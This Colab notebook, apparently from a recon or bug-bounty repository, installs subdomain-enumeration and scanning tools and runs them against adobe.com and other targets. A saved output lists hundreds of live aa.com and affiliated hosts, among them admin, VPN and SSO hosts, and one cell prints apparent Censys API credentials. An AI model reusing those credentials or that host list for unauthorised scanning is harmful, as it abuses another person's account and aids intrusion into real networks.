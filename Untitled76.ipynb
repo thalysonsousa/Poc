{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/thalysonsousa/Poc/blob/main/Untitled76.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "GtukqlsvOIsg"
      },
      "source": [
        "## Install tools"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "nUOHPbPiOL_N"
      },
      "outputs": [],
      "source": [
        "!curl https://sh.rustup.rs | tee -a rust.sh; chmod +x rust.sh"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "r02UAyTbOPZj"
      },
      "outputs": [],
      "source": [
        "!./rust.sh"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "czPLNSPoOQtA"
      },
      "outputs": [],
      "source": [
        "!git clone https://github.com/RustScan/RustScan; source \"$HOME/.cargo/env\"; cd RustScan; cargo build --release"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "KqceeNyROTR8"
      },
      "outputs": [],
      "source": [
        "!cp RustScan/target/release/rustscan /usr/local/bin; wget https://go.dev/dl/go1.20.4.linux-amd64.tar.gz; rm -rf /usr/local/go && tar -C /usr/local -xzf go1.20.4.linux-amd64.tar.gz"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "1hFTu8WOOWbh"
      },
      "outputs": [],
      "source": [
        "!export PATH=$PATH:/usr/local/go/bin; go install -v github.com/tomnomnom/anew@latest; go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest; go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest;"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!export PATH=$PATH:/usr/local/go/bin; go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
      ],
      "metadata": {
        "id": "KxdYD7Ig9PMJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 7,
      "metadata": {
        "id": "9Jg5FVhJOY0s"
      },
      "outputs": [],
      "source": [
        "!cp /root/go/bin/* /usr/local/bin"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "ZbuR6dh6OaJf"
      },
      "outputs": [],
      "source": [
        "!git clone https://github.com/christophetd/censys-subdomain-finder"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "5LD7T9yIOwz2"
      },
      "outputs": [],
      "source": [
        "!cd censys-subdomain-finder; pip install -r requirements.txt"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 10,
      "metadata": {
        "id": "dW6dWn1uOyn9"
      },
      "outputs": [],
      "source": [
        "!cd censys-subdomain-finder; cp .env.template .env"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 11,
      "metadata": {
        "id": "4WJE_EBeO0eS"
      },
      "outputs": [],
      "source": [
        "!cd censys-subdomain-finder; echo \"CENSYS_API_ID=118b229d-47cc-46e6-a338-323660a7e422\" >> .env; echo \"CENSYS_API_SECRET=0i5g52VLOomOAXSJWzJZ9Irl6ymn02D2\" >> .env"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 12,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "AFqFseiTQrtr",
        "outputId": "d30f603d-7afd-4ec1-fc5a-2d50c3e6ef6d"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "CENSYS_API_ID=\n",
            "CENSYS_API_SECRET=\n",
            "CENSYS_API_ID=118b229d-47cc-46e6-a338-323660a7e422\n",
            "CENSYS_API_SECRET=0i5g52VLOomOAXSJWzJZ9Irl6ymn02D2\n"
          ]
        }
      ],
      "source": [
        "!cd censys-subdomain-finder; cat .env"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "E-E0rsUBO6c8"
      },
      "source": [
        "## Tools"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "pnYC4fmlO8Hh"
      },
      "outputs": [],
      "source": [
        "!rustscan -a files.dev.dexilab.acrobat.com\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "-11uSx6SO-xY"
      },
      "outputs": [],
      "source": [
        "!cd censys-subdomain-finder; python censys-subdomain-finder.py adobe.com -o ../subs.txt"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!subfinder -dL target/p.txt -pc config/provider-subfinder.txt -timeout 10 | anew subs.txt"
      ],
      "metadata": {
        "id": "ojOnk0Qr9gnJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!subfinder -d adobe.com -pc config/provider-subfinder.txt | anew subs.txt"
      ],
      "metadata": {
        "id": "KzifYEMP-fvP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!cat subs.txt | httpx --threads 1000 | tee -a httpx.txt"
      ],
      "metadata": {
        "id": "OjaTdjt_vYTT",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "b0f8953c-6070-4208-88ab-d8c6c950d159"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "    __    __  __       _  __\n",
            "   / /_  / /_/ /_____ | |/ /\n",
            "  / __ \\/ __/ __/ __ \\|   /\n",
            " / / / / /_/ /_/ /_/ /   |\n",
            "/_/ /_/\\__/\\__/ .___/_/|_|\n",
            "             /_/\n",
            "\n",
            "\t\tprojectdiscovery.io\n",
            "\n",
            "[\u001b[34mINF\u001b[0m] Current httpx version v1.3.3 (\u001b[92mlatest\u001b[0m)\n",
            "https://aa-mi.aa.com\n",
            "https://aads2.aa.com\n",
            "https://aads1.aa.com\n",
            "https://aads4.aa.com\n",
            "https://aads5.aa.com\n",
            "https://aamaintweb.aa.com\n",
            "https://aads3.aa.com\n",
            "https://aagrc.aa.com\n",
            "https://aagrctemp.aa.com\n",
            "https://aaflightservice.aa.com\n",
            "https://aaflightservice.stage.aa.com\n",
            "https://ags.pdc.citrix.aa.com\n",
            "https://aapilots.aa.com\n",
            "https://agr.pdc.citrix.aa.com\n",
            "https://etdw-stage.aa.com\n",
            "https://agp.cdc.citrix.aa.com\n",
            "https://escshareservices.aa.com\n",
            "https://airportal.stage.aa.com\n",
            "https://evouchers.stage.aa.com\n",
            "https://faadr.citrix.aa.com\n",
            "https://airportal.aa.com\n",
            "https://aart.jetnet.aa.com\n",
            "https://facebook.snap.aa.com\n",
            "https://aart.aa.com\n",
            "https://aemes.envoy.aa.com\n",
            "https://escshareservices-tst.qcorpaa.aa.com\n",
            "https://ags.cdc.citrix.aa.com\n",
            "https://aiops.aa.com\n",
            "https://facet-test.aa.com\n",
            "https://evouchers.aa.com\n",
            "https://aavpn.aa.com\n",
            "https://faa.citrix.aa.com\n",
            "https://adfs.aa.com\n",
            "https://admin.cci-dev.aa.com\n",
            "https://airpass.stage.aa.com\n",
            "https://admin.cci-test.aa.com\n",
            "https://aatot-api.maverick.aa.com\n",
            "https://aatot-api-dev.maverick.aa.com\n",
            "https://etdw.aa.com\n",
            "https://admin.cci.aa.com\n",
            "https://admin.businessextra.stage.aa.com\n",
            "https://fly.aa.com\n",
            "https://apops-stage.aa.com\n",
            "https://aspectwfm.pdc.aa.com\n",
            "https://aspectmobile.pdc.aa.com\n",
            "https://fly.stage.aa.com\n",
            "https://fos.aa.com\n",
            "https://fb.aa.com\n",
            "https://fb-stg.aa.com\n",
            "https://flightdiscounts.stage.aa.com\n",
            "https://falrd.aa.com\n",
            "https://faetb-trng.aa.com\n",
            "https://fltinvhub.aa.com\n",
            "https://apm.aa.com\n",
            "https://faportal.horizon.plano.aa.com\n",
            "https://api.stage.eagleeye.aa.com\n",
            "https://flightdiscounts.aa.com\n",
            "https://faportal.aa.com\n",
            "https://aspectmobile.stage.aa.com\n",
            "https://faroms.aa.com\n",
            "https://facet9-test.qcorpaa.aa.com\n",
            "https://apps.newjetnet.uat.aa.com\n",
            "https://fafdgd.aa.com\n",
            "https://airpass.aa.com\n",
            "https://fdgd-apigateway.aa.com\n",
            "https://alpsv.aa.com\n",
            "https://fdgd-admin.aa.com\n",
            "https://featureflags-api.aa.com\n",
            "https://api.psaairlines.com\n",
            "https://apps.psaairlines.com\n",
            "https://faetb.aa.com\n",
            "https://filecloud.poc.aa.com\n",
            "https://fagfd-test.qcorpaa.aa.com\n",
            "https://fagfd.horizon.cherokee.aa.com\n",
            "https://api.nonprod.eagleeye.aa.com\n",
            "https://faportal.horizon.cherokee.aa.com\n",
            "https://fdgds-test-admin.aa.com\n",
            "https://faetb-test.qcorpaa.aa.com\n",
            "https://favms.aa.com\n",
            "https://app.piedmont-airlines.com\n",
            "https://amp.psaairlines.com\n",
            "https://fbc.aa.com\n",
            "https://fdgd-dev-admin.aa.com\n",
            "https://flightcaps.aa.com\n",
            "https://api.release.eagleeye.aa.com\n",
            "https://faroms-test.qcorpaa.aa.com\n",
            "https://api.dev.eagleeye.aa.com\n",
            "https://fleetfocus.aa.com\n",
            "https://asguard.aa.com\n",
            "https://aos.psaairlines.com\n",
            "https://fdgd-stage-admin.aa.com\n",
            "https://apps.newjetnet.aa.com\n",
            "https://blackduck.aa.com\n",
            "https://brand.aa.com\n",
            "https://cargoinfo.email.aa.com\n",
            "https://av.aa.com\n",
            "https://atd.jetnet.aa.com\n",
            "https://caats.aa.com\n",
            "https://audit.aa.com\n",
            "https://atd.stage.jetnet.aa.com\n",
            "https://fleetfocusstg.aa.com\n",
            "https://auth.datelection-stage.aa.com\n",
            "https://buymiles.aa.com\n",
            "https://autodiscover.aa.com\n",
            "https://auth.gpms-stage.aa.com\n",
            "https://auth.datelection-dev1.aa.com\n",
            "https://businessextra.stage.aa.com\n",
            "https://cabin.aa.com\n",
            "https://can.aa.com\n",
            "https://crewhub-test.aa.com\n",
            "https://cdn.flyaa.aa.com\n",
            "https://cdn.qasilo12-7.flyaa.aa.com\n",
            "https://cdn.qa3.flyaa.aa.com\n",
            "https://cdn.qasilo12-5.flyaa.aa.com\n",
            "https://cdn.qa12.flyaa.aa.com\n",
            "https://cdn.qasilo12-4.flyaa.aa.com\n",
            "https://cdn.qasilo12-6.flyaa.aa.com\n",
            "https://cdn.qasilo12-1.flyaa.aa.com\n",
            "https://cdn.qa7.flyaa.aa.com\n",
            "https://ctsoa.aa.com\n",
            "https://csubl.aa.com\n",
            "https://ct.aa.com\n",
            "https://ctstg.aa.com\n",
            "https://csmstage.aa.com\n",
            "https://cka.aa.com\n",
            "https://ct2.aa.com\n",
            "https://cir-team.aa.com\n",
            "https://cdn.qa9.flyaa.aa.com\n",
            "https://cdn.qasilo12-3.flyaa.aa.com\n",
            "https://cers-stage.aa.com\n",
            "https://cass.aa.com\n",
            "https://cdn.qa6.flyaa.aa.com\n",
            "https://cme-stage.pdc.aa.com\n",
            "https://cdn.qa11.flyaa.aa.com\n",
            "https://cdn.stage.flyaa.aa.com\n",
            "https://cdn.iqa1.flyaa.aa.com\n",
            "https://cass-stage.aa.com\n",
            "https://cdn.qa10.flyaa.aa.com\n",
            "https://cdn.aa.com\n",
            "https://cdn.qa2.flyaa.aa.com\n",
            "https://crewsuite.psaairlines.com\n",
            "https://ctstgsoa.aa.com\n",
            "https://cdn.qa1.flyaa.aa.com\n",
            "https://centralbaggage.aa.com\n",
            "https://cka85.aa.com\n",
            "https://cers.aa.com\n",
            "https://crewcheckin.plano.aa.com\n",
            "https://crewcheckin.cherokee.aa.com\n",
            "https://cdn.qa4.flyaa.aa.com\n",
            "https://cci-test.aa.com\n",
            "https://cdn.qa5.flyaa.aa.com\n",
            "https://crewcheckin-stg.cherokee.aa.com\n",
            "https://crewcheckin-stg.plano.aa.com\n",
            "https://cdn.iqa2.flyaa.aa.com\n",
            "https://crewhub-stage.aa.com\n",
            "https://cci.aa.com\n",
            "https://cjsas.aa.com\n",
            "https://cdn.qa8.flyaa.aa.com\n",
            "https://crew.cci-test.aa.com\n",
            "https://cjsad.aa.com\n",
            "https://cjsa.aa.com\n",
            "https://crew.cci.aa.com\n",
            "https://ctwst.psaairlines.com\n",
            "https://drss-iqsilo19-sjc.aa.com\n",
            "https://desktopbackup.aa.com\n",
            "https://ecmappservices-stg.aa.com\n",
            "https://dr.citrix.aa.com\n",
            "https://connectme-stage.aa.com\n",
            "https://corpcomm.jetnet.aa.com\n",
            "https://eagle.jetnet.aa.com\n",
            "https://dss-flifo.aa.com\n",
            "https://eaglehubpartnersstage.aa.com\n",
            "https://eaglehubaffiliatesstage.aa.com\n",
            "https://dash.aa.com\n",
            "https://ecmimg-tst.qcorpaa.aa.com\n",
            "https://ecmappservices.aa.com\n",
            "https://cxp.aa.com\n",
            "https://department.jetnet.aa.com\n",
            "https://ecmappservices-tst.qcorpaa.aa.com\n",
            "https://datelection-dev1.aa.com\n",
            "https://darma.aa.com\n",
            "https://custprofile.stage.fop.aa.com\n",
            "https://eap.aa.com\n",
            "https://dctmextservices.aa.com\n",
            "https://customermdm-dataquality-preprod.aa.com\n",
            "https://eaglehubcarrieropsapi.stage.aa.com\n",
            "https://dat-admin-svc.gpms-dev1.aa.com\n",
            "https://dat-admin-web.gpms-stage.aa.com\n",
            "https://dat-admin-web.gpms-dev1.aa.com\n",
            "https://datelection-stage.aa.com\n",
            "https://dat-admin-svc.gpms-stage.aa.com\n",
            "https://dctmextservices.dev.aa.com\n",
            "https://dctmextservices.stg.aa.com\n",
            "https://darma-stage.aa.com\n",
            "https://envoystaff.aa.com\n",
            "https://dev-eap.aa.com\n",
            "https://escshareservices-stg.aa.com\n",
            "https://dh.psaairlines.com\n",
            "https://entertainment.aa.com\n",
            "https://emanager.jetnet.aa.com\n",
            "https://employeetravel.stage.aa.com\n",
            "https://employeetravel.aa.com\n",
            "https://employeepay.aa.com\n",
            "https://directconnect.aa.com\n",
            "https://enginemanuals.psa.aa.com\n",
            "https://dev.snap.aa.com\n",
            "https://dev-cxp.aa.com\n",
            "https://emp.piedmont-airlines.com\n",
            "https://devsquad360.aa.com\n",
            "https://edldap.qtcorpaa.aa.com\n",
            "https://emp.psaairlines.com\n",
            "https://analytics.pdc.aa.com\n",
            "https://dfw-a-hmi01.bhs.aa.com\n",
            "https://dfw-a-hmi02.bhs.aa.com\n",
            "http://aepp.jetnet.aa.com\n",
            "http://ewfmstage-tmp.aa.com\n",
            "http://aepp.jetnet.stage.aa.com\n",
            "http://facet.aa.com\n",
            "http://ewfmstage.aa.com\n",
            "https://frms-stg.aa.com\n",
            "https://get-pdc.aa.com\n",
            "https://get.aa.com\n",
            "https://get-cdc.aa.com\n",
            "https://get-beta.aa.com\n",
            "https://fwu.aa.com\n",
            "https://fsa.aa.com\n",
            "http://aspectwfm.cdc.aa.com\n",
            "http://facet9.aa.com\n",
            "http://americancares.jetnet.aa.com\n",
            "http://fagfd.horizon.plano.aa.com\n",
            "http://aspectmobile.cdc.aa.com\n",
            "http://apops-test.qcorpaa.aa.com\n",
            "http://falrd-test.qcorpaa.aa.com\n",
            "https://getng-stage.aa.com\n",
            "https://get.azpe.aa.com\n",
            "https://globalsales.stage.aa.com\n",
            "https://getng.aa.com\n",
            "https://get.azne.aa.com\n",
            "https://globalsupport.aa.com\n",
            "https://global.aa.com\n",
            "https://get.azpw.aa.com\n",
            "https://giftcards.aa.com\n",
            "https://globalstage.aa.com\n",
            "https://grafana.aa.com\n",
            "https://get.stage.aa.com\n",
            "https://gpms-stage.aa.com\n",
            "https://globaltest.qcorpaa.aa.com\n",
            "https://giftcards.stage.aa.com\n",
            "https://globalsales.aa.com\n",
            "https://gpms-dev1.aa.com\n",
            "https://groups.stage.aa.com\n",
            "http://bc-stage.aa.com\n",
            "https://dev.envoyair.com\n",
            "http://crewportal.aa.com\n",
            "https://idp.aa.com\n",
            "https://hr.jetnet.aa.com\n",
            "https://ids.aa.com\n",
            "https://image.jetnet.aa.com\n",
            "https://hrassistance.jetnet.aa.com\n",
            "https://ifs9-test.qcorpaa.aa.com\n",
            "https://identitymanagementservices-test.aa.com\n",
            "https://imageservice.aa.com\n",
            "https://i11l-services.aa.com\n",
            "https://hsda.techops.aa.com\n",
            "https://idpstagepdc.aa.com\n",
            "https://idpstage.aa.com\n",
            "https://i9.fn.aa.com\n",
            "https://idppdc.aa.com\n",
            "https://innovations.aa.com\n",
            "https://idpcdc.aa.com\n",
            "https://innovations.stage.aa.com\n",
            "https://idpstagecdc.aa.com\n",
            "https://apis.cargo.aa.com\n",
            "http://ecmimg-stg.aa.com\n",
            "http://ecmservices-acs2.aa.com\n",
            "http://ecmservices-acs1.aa.com\n",
            "http://dotc.aa.com\n",
            "http://ecmimg.aa.com\n",
            "http://ecmservices-tst-acs1.qcorpaa.aa.com\n",
            "https://iqa.qa.aa.com\n",
            "https://isolve.aa.com\n",
            "https://itservices.aa.com\n",
            "https://ivoucher.aa.com\n",
            "https://itas.aa.com\n",
            "https://isolve.stage.aa.com\n",
            "https://jamfpro.aa.com\n",
            "https://isolve.test.aa.com\n",
            "http://edldap.stage.aa.com\n",
            "http://edldap.aa.com\n",
            "http://ecmservicesnew-stg-acs2.aa.com\n",
            "http://ecmservicesnew-stg-acs1.aa.com\n",
            "http://escshareservices-dr.aa.com\n",
            "https://jobs.envoyair.com\n",
            "https://lms.aa.com\n",
            "https://lisa-websocket-american.kaas-np.aa.com\n",
            "https://kcm-prod.aa.com\n",
            "https://learninghub.aa.com\n",
            "https://kronosadmin.aa.com\n",
            "https://lmo.me.aa.com\n",
            "https://kcm.aa.com\n",
            "https://kcm-stage.aa.com\n",
            "https://lounge.aa.com\n",
            "https://cdn.qasilo12-2.flyaa.aa.com\n",
            "https://lka.aa.com\n",
            "https://keystar.aa.com\n",
            "https://login.hub.aa.com\n",
            "https://journal.piedmont-airlines.com\n",
            "https://lka-stg.aa.com\n",
            "https://keystar.stage.aa.com\n",
            "https://keystarrt.stage.aa.com\n",
            "https://jobs.aa.com\n",
            "https://k2.psaairlines.com\n",
            "https://m.smbdirect.stage.aa.com\n",
            "https://k2test.psaairlines.com\n",
            "https://mdmds.test.aa.com\n",
            "https://mdmdse.test.aa.com\n",
            "https://mdmds.aa.com\n",
            "https://manuals-ext.aa.com\n",
            "https://mdmdse.aa.com\n",
            "https://manuals2-ext.aa.com\n",
            "https://me.meweb.aa.com\n",
            "https://manuals-ext.meweb.aa.com\n",
            "https://manuals2-stage-ext.aa.com\n",
            "https://me.citrix.aa.com\n",
            "https://mbp.qa.aa.com\n",
            "https://maintenix.psa.aa.com\n",
            "https://mctapp.aa.com\n",
            "https://me.aa.com\n",
            "https://manuals.piedmont-airlines.com\n",
            "https://mdt.manuals.piedmont-airlines.com\n",
            "http://handpunch.aa.com\n",
            "https://medical.jetnet.aa.com\n",
            "https://mercury-dr.aa.com\n",
            "https://mercury-stg2.aa.com\n",
            "https://mercury-stg1.aa.com\n",
            "https://mobiledata-stage.aa.com\n",
            "https://mobiledata.aa.com\n",
            "https://mfdb2.gpms-stage.aa.com\n",
            "https://mercury.aa.com\n",
            "https://mfa.aa.com\n",
            "https://messaging-vachat-forms.aa.com\n",
            "https://mercury-cert.aa.com\n",
            "https://moc-service-asom.prod.aa.com\n",
            "https://mfdb2.gpms-dev1.aa.com\n",
            "https://mpays.aa.com\n",
            "https://ndc.aa.com\n",
            "https://mypiedmont.aa.com\n",
            "https://nsms.cne.stage.aa.com\n",
            "https://my.envoyair.com\n",
            "https://newme.meweb.aa.com\n",
            "https://newcers.aa.com\n",
            "https://newjetnet.aa.com\n",
            "https://nrs.ae.aa.com\n",
            "https://newcers-stage.aa.com\n",
            "https://ndc.stage.aa.com\n",
            "https://mypsa.aa.com\n",
            "https://opa.aa.com\n",
            "https://newemployeetravel.test.aa.com\n",
            "https://newatd.test.qcorpaa.aa.com\n",
            "https://opsapi.eaglehub.stage.aa.com\n",
            "https://notify.psaairlines.com\n",
            "https://one.aa.com\n",
            "https://newjetnet.uat.aa.com\n",
            "https://mysite.aa.com\n",
            "https://one-notify.opsco.aa.com\n",
            "https://one-crewapp.opsco.aa.com\n",
            "https://obs.aa.com\n",
            "https://one-stg.aa.com\n",
            "https://obs-stg.aa.com\n",
            "http://ids-stage.aa.com\n",
            "https://owrcm-dr.aa.com\n",
            "https://people-stage.aa.com\n",
            "https://owrcm-stg.aa.com\n",
            "https://owrcm.aa.com\n",
            "https://pensionoptin.aa.com\n",
            "https://pensionoptin-stage.aa.com\n",
            "https://plano.cci.aa.com\n",
            "https://owrcm-cert.aa.com\n",
            "https://otc-test.psaairlines.com\n",
            "https://osp.aa.com\n",
            "https://payprotect.plano.aa.com\n",
            "https://otc.psaairlines.com\n",
            "https://pilotpbs.aa.com\n",
            "https://pilot-tts.aa.com\n",
            "https://owrcm-common.aa.com\n",
            "https://pilots.aa.com\n",
            "https://piedmont.aa.com\n",
            "https://pilotpbs-stg.aa.com\n",
            "https://pay.aa.com\n",
            "https://pilot-dotc.aa.com\n",
            "https://payprotect.cherokee.aa.com\n",
            "https://planningvalidator.psaairlines.com\n",
            "https://planningvalidatorapi.psaairlines.com\n",
            "https://prefunds.aa.com\n",
            "https://pilotpbs-sb.aa.com\n",
            "https://people.aa.com\n",
            "https://payprotect-stg.cherokee.aa.com\n",
            "https://paydocs.envoyair.com\n",
            "https://pdb.aa.com\n",
            "https://my.aa.com\n",
            "https://paydocs.stage.envoyair.com\n",
            "https://premium-service.stage.aa.com\n",
            "https://pilot.vms.aa.com\n",
            "http://itas.stage.aa.com\n",
            "https://psa.aa.com\n",
            "https://public.stage.esoa.aa.com\n",
            "https://premium.stage.aa.com\n",
            "https://qa-cxp.aa.com\n",
            "https://public.dev.esoa.qcorpaa.aa.com\n",
            "https://qadfs.aa.com\n",
            "https://qa.cdn.aa.com\n",
            "https://prod.citrix.aa.com\n",
            "https://public.qa.esoa.qcorpaa.aa.com\n",
            "https://qa-eap.aa.com\n",
            "https://qa.services.aa.com\n",
            "https://prodtest.aa.com\n",
            "https://public.esoa.aa.com\n",
            "https://psaairlines.com\n",
            "https://premium.aa.com\n",
            "http://auth.gpms-dev1.aa.com\n",
            "http://meapps-stg70-ext.aa.com\n",
            "https://quickbuy.aa.com\n",
            "https://portal-stage.envoyair.com\n",
            "https://qikview.aa.com\n",
            "http://msr-portal.aa.com\n",
            "http://newmfd-stg.aa.com\n",
            "http://mfa.stage.aa.com\n",
            "http://ngp-dr.aa.com\n",
            "http://ngp-stg.aa.com\n",
            "http://newmfd.aa.com\n",
            "https://retirees.aa.com\n",
            "https://release.psaairlines.com\n",
            "https://regionaltraining.aa.com\n",
            "https://retirees-stg-mg.aa.com\n",
            "https://retirees-stg.aa.com\n",
            "https://remote.workspace.aa.com\n",
            "https://rmshareapps-lab.qcorpaa.aa.com\n",
            "https://report-view.gpms-dev1.aa.com\n",
            "https://releaseapi.piedmont-airlines.com\n",
            "https://remote.workspacestage.aa.com\n",
            "https://releaseapi.psaairlines.com\n",
            "https://release.piedmont-airlines.com\n",
            "https://report-view.gpms-stage.aa.com\n",
            "https://resagent.aa.com\n",
            "http://efreight.cargo.aa.com\n",
            "https://saleshub.serverless.qa.aa.com\n",
            "https://rpcs-dr.me.aa.com\n",
            "https://sam-dr.aa.com\n",
            "https://runway.aa.com\n",
            "https://sam-dr.stage.aa.com\n",
            "https://rpcs.me.aa.com\n",
            "https://rovrplus.aa.com\n",
            "https://sam.aa.com\n",
            "https://sam.qcorpaa.aa.com\n",
            "https://sam.stage.aa.com\n",
            "https://saleslink-insights.dev.aa.com\n",
            "http://groups.payment.stage.aa.com\n",
            "https://scm.ext.me.aa.com\n",
            "https://sharepoint.aa.com\n",
            "https://services.cci.aa.com\n",
            "https://selftag-cdc.aa.com\n",
            "https://security.aa.com\n",
            "https://secure.fly.aa.com\n",
            "https://selftag-beta-cdc.aa.com\n",
            "https://secureauthentication.snap.aa.com\n",
            "https://selftag-pdc-stage.aa.com\n",
            "https://simquest-stage.aa.com\n",
            "https://simquestwp-stage.aa.com\n",
            "https://simquestapi.aa.com\n",
            "https://services.cci-dev.aa.com\n",
            "https://setoolapi.aa.com\n",
            "https://setool.apps.aa.com\n",
            "https://setool.aa.com\n",
            "https://seatselect.stage.aa.com\n",
            "https://seatselect.aa.com\n",
            "https://services.cci-test.aa.com\n",
            "https://sam.qtcorpaa.aa.com\n",
            "https://smetrics.aa.com\n",
            "https://soa.apim.dev.sales.aa.com\n",
            "https://smlogin.aa.com\n",
            "https://skytech.stage.psaairlines.com\n",
            "https://ssc.aa.com\n",
            "https://skytech.psaairlines.com\n",
            "https://snap.test.aa.com\n",
            "https://ssc.stage.aa.com\n",
            "https://spportal.aa.com\n",
            "https://squad360.aa.com\n",
            "https://spteam.aa.com\n",
            "https://smlogin.stage.aa.com\n",
            "https://smlogin.qtcorpaa.aa.com\n",
            "https://tableau.aa.com\n",
            "https://techopsk2.uat.corpaa.aa.com\n",
            "https://ssofedstagecdc.aa.com\n",
            "https://stage.maintenix.psa.aa.com\n",
            "https://sse.jetnet.aa.com\n",
            "https://test.snap.aa.com\n",
            "https://stage.enginemanuals.psa.aa.com\n",
            "https://techopshub.me.aa.com\n",
            "https://ssofedpdc.aa.com\n",
            "https://ssofedcdc.aa.com\n",
            "https://testamp.psaairlines.com\n",
            "https://ssofedstagepdc.aa.com\n",
            "https://svc.datelection-stage.aa.com\n",
            "https://testplanningvalidator.psaairlines.com\n",
            "https://stage-cxp.aa.com\n",
            "https://stage-pdc.citrix.aa.com\n",
            "https://stage.aa.com\n",
            "https://testapi.psaairlines.com\n",
            "https://stage-eap.aa.com\n",
            "https://supplychain.airwall.aa.com\n",
            "https://testapps.piedmont-airlines.com\n",
            "https://stage.services.aa.com\n",
            "https://tac.aa.com\n",
            "https://ssofedstage.aa.com\n",
            "https://testnotify.psaairlines.com\n",
            "https://techopsbiddinghub.aa.com\n",
            "https://testaos.psaairlines.com\n",
            "https://tac.stage.aa.com\n",
            "https://ssofed.aa.com\n",
            "https://wallet.cne.aa.com\n",
            "https://train.maintenix.psa.aa.com\n",
            "https://uat.maintenix.psa.aa.com\n",
            "https://uagzncusn.aa.com\n",
            "https://testreleaseapi.psaairlines.com\n",
            "https://tms-stage.aa.com\n",
            "https://tokenservice.psaairlines.com\n",
            "https://testtokenservice.psaairlines.com\n",
            "https://virtualtime.aa.com\n",
            "https://tms.aa.com\n",
            "https://testxladv.psaairlines.com\n",
            "https://webfos.stage.aa.com\n",
            "https://tms-comp.aa.com\n",
            "https://uagzeusn.aa.com\n",
            "https://wb.etm.aa.com\n",
            "https://webfos.aa.com\n",
            "https://web.dss.aa.com\n",
            "https://tulsa.cci.aa.com\n",
            "https://twitter.snap.aa.com\n",
            "https://tms-comp-stage.aa.com\n",
            "https://testrelease.piedmont-airlines.com\n",
            "https://testrelease.psaairlines.com\n",
            "https://ttsfa.aa.com\n",
            "https://testreleaseapi.piedmont-airlines.com\n",
            "https://tso-svc.gpms-dev1.aa.com\n",
            "https://tso-svc.gpms-stage.aa.com\n",
            "https://tso-web.gpms-stage.aa.com\n",
            "https://tso-web.gpms-dev1.aa.com\n",
            "https://testcrewsuite.psaairlines.com\n",
            "https://transfer.aa.com\n",
            "https://tts.aa.com\n",
            "https://viewandpay.aa.com\n",
            "https://tts-stg.aa.com\n",
            "http://sbywebl1.piedmont-airlines.com\n",
            "https://webfosapp.stage.aa.com\n",
            "https://webref.jetnet.aa.com\n",
            "https://workspacestage.aa.com\n",
            "https://webmail.piedmont-airlines.com\n",
            "https://webref.stage.aa.com\n",
            "https://webmail.aa.com\n",
            "https://webref.aa.com\n",
            "https://workspacedfwstg.aa.com\n",
            "https://webfosapp.aa.com\n",
            "https://www.airpass.aa.com\n",
            "https://svc.datelection-dev1.aa.com\n",
            "https://www.fb.aa.com\n",
            "https://www.fb-stg.aa.com\n",
            "https://tokensvc.psaairlines.com\n",
            "https://www.fly.aa.com\n",
            "https://www.employeepay.aa.com\n",
            "http://spe-nonprod.aa.com\n",
            "https://www.ndc.aa.com\n",
            "https://www.envoyair.com\n",
            "http://stage.snap.aa.com\n",
            "https://www.newjetnet.aa.com\n",
            "https://www.piedmont-airlines.com\n",
            "https://www.retirees.aa.com\n",
            "https://www.retirees-stg.aa.com\n",
            "https://www.retirees-stg-mg.aa.com\n",
            "https://www.psaairlines.com\n",
            "http://wfm.stage.aa.com\n",
            "https://xcautostage.aa.com\n",
            "https://xladv.psaairlines.com\n",
            "http://selftag-beta-pdc-stage.aa.com\n",
            "http://rlplus-beta-pdc-stage.aa.com\n",
            "http://smbdirect.stage.aa.com\n",
            "http://stagecitrix2.aa.com\n",
            "http://stage-me.citrix.aa.com\n",
            "http://stage-faa.citrix.aa.com\n",
            "http://stage-citrix.aa.com\n",
            "http://rlplus-test.qcorpaa.aa.com\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!rm *.txt"
      ],
      "metadata": {
        "id": "5CX1YkY6vyFs"
      },
      "execution_count": 16,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "background_save": true
        },
        "id": "RC3uj4aLQ5xY",
        "outputId": "12a17a10-5bcb-477d-f5b9-f3456e0bf130"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "^C\n"
          ]
        }
      ],
      "source": [
